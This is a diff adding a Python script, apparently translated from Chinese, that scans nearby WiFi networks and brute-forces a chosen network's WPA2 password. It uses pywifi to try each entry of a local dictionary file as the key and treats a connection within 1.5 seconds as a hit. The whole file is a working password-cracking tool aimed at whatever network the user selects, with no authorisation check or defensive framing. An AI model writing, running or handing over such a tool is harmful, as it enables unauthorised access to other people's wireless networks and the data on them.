@@ -1,0 +1,136 @@
+import pywifi
+import time
+from pywifi import const
+ 
+# WiFi scanning module
+def wifi_scan():
+     # Initialize wifi
+     wifi = pywifi.PyWiFi()
+     # use the first wireless network card
+     interface = wifi. interfaces()[0]
+     # start scanning
+     interface. scan()
+     for i in range(4):
+         time. sleep(1)
+         print('\rScanning available WiFi, please wait...(' + str(3 - i), end=')')
+     print('\rScan complete!\n' + '-' * 38)
+     print('\r{:4}{:6}{}'.format('number', 'signal strength', 'wifi name'))
+     # Scanning results, scan_results() returns a set, which stores each wifi object
+     bss = interface. scan_results()
+     # Store the collection of wifi names
+     wifi_name_set = set()
+     for w in bss:
+         # Solve the garbled problem
+         wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
+         wifi_name_set.add(wifi_name_and_signal)
+     # store in list and sort by signal
+     wifi_name_list = list(wifi_name_set)
+     wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
+     num = 0
+     # formatted output
+     while num < len(wifi_name_list):
+         print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
+         num += 1
+     print('-' * 38)
+     # Return wifi list
+     return wifi_name_list
+ 
+# WIFI cracking module
+def wifi_password_crack(wifi_name):
+     # dictionary path
+     wifi_dic_path = input("Please enter the path of the local password dictionary (txt format, each password occupies 1 line) for WIFI brute force cracking:")
+     with open(wifi_dic_path, 'r') as f:
+         # loop through passwords
+         for pwd in f:
+             # Remove trailing newlines from passwords
+             pwd = pwd. strip('\n')
+             # create wifi object
+             wifi = pywifi.PyWiFi()
+             # Create a network card object for the first wifi network card
+             interface = wifi. interfaces()[0]
+             # Disconnect all wifi connections
+             interface. disconnect()
+             # wait for it to disconnect
+             while interface. status() == 4:
+                 # When it is connected, use a loop to wait for it to disconnect
+                 pass
+             # Create connection file (object)
+             profile = pywifi. Profile()
+             # wifi name
+             profile.ssid = wifi_name
+             # requires authentication
+             profile.auth = const.AUTH_ALG_OPEN
+             # wifi default encryption algorithm
+             profile.akm.append(const.AKM_TYPE_WPA2PSK)
+             profile.cipher = const.CIPHER_TYPE_CCMP
+             # wifi password
+             profile.key = pwd
+             # delete all wifi connection files
+             interface. remove_all_network_profiles()
+             # Set up a new wifi connection file
+             tmp_profile = interface.add_network_profile(profile)
+             # start trying to connect
+             interface. connect(tmp_profile)
+             start_time = time. time()
+             while time.time() - start_time < 1.5:
+                 # The interface status is 4, which means the connection is successful (when the trial time is greater than 1.5 seconds, it is an incorrect password. The correct password is generally connected within 1.5 seconds after testing. If you want to improve the accuracy, you can set it to 2s or above, and the corresponding brute force cracking speed will be slower)
+                 if interface.status() == 4:
+                     print(f'\rThe connection is successful! The password is: {pwd}')
+                     exit(0)
+                 else:
+                     print(f'\r is trying to crack with password {pwd}.', end='')
+# main function
+def main():
+     # Exit Peugeot
+     exit_flag = 0
+     # target number
+     target_num = -1
+     while not exit_flag:
+         try:
+             print('WiFi master key'.center(35, '-'))
+             # Call the scan module and return a sorted wifi list
+             wifi_list = wifi_scan()
+             # Let the user choose the wifi number to be cracked, and judge and handle exceptions for the number entered by the user
+             choose_exit_flag = 0
+             while not choose_exit_flag:
+                 try:
+                     target_num = int(input('Please select the wifi you want to crack:'))
+                     # If the wifi number to be selected is in the list, continue with the second judgment, otherwise re-enter
+                     if target_num in range(len(wifi_list)):
+                         # Second confirmation
+                         while not choose_exit_flag:
+                             try:
+                                 choose = str(input(f'The WiFi name you choose to crack is: {wifi_list[target_num][1]}, are you sure? (Y/N)'))
+                                 # Lowercase the user input and judge
+                                 if choose.lower() == 'y':
+                                     choose_exit_flag = 1
+                                 elif choose.lower() == 'n':
+                                     break
+                                 # Handle other letter input by user
+                                 else:
+                                     print('You can only enter Y/N oh o(*￣︶￣*)o')
+                             # Handle user non-alphabetic input
+                             except ValueError:
+                                 print('You can only enter Y/N oh o(*￣︶￣*)o')
+                         # Exit cracking
+                         if choose_exit_flag == 1:
+                             break
+                         else:
+                             print('Please re-enter (*^▽^*)')
+                 except ValueError:
+                     print('You can only enter numbers o(*￣︶￣*)o')
+             # Password cracking, pass in the wifi name selected by the user
+             wifi_password_crack(wifi_list[target_num][1])
+             print('-' * 38)
+             exit_flag = 1
+         except Exception as e:
+             print(e)
+             raise e
+ 
+ 
+if __name__ == '__main__':
+     main()
+
+
+
+
